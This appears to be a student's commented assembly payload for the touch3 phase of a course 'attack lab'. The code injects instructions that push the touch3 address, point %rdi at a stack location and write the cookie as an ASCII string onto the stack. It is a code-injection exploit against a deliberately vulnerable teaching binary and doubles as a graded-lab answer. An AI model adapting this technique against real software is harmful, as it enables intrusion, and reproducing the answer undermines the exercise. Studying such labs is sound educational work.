// touch3() function address
// when execute the bottom retq instruction, this address gets poped and go to the touch3 fun.
pushq $0x4018fa

// 0x5561dc88 represent %rbp got pushed address in stack frame during execute hexmatch().
mov $0x5561dc88,%rdi

// 0x6166373939623935 represent cookie (which is 0x59b997fa) in ASCII code: 
// 0x35 0x39 0x62 0x39
// 0x39 0x37 0x66 0x61
mov $0x6166373939623935,%rbp

// clear %12, because %r12 is pushed in stack before %rbp so that it serves as the tailing zero for input string.
xor %r12,%r12
retq
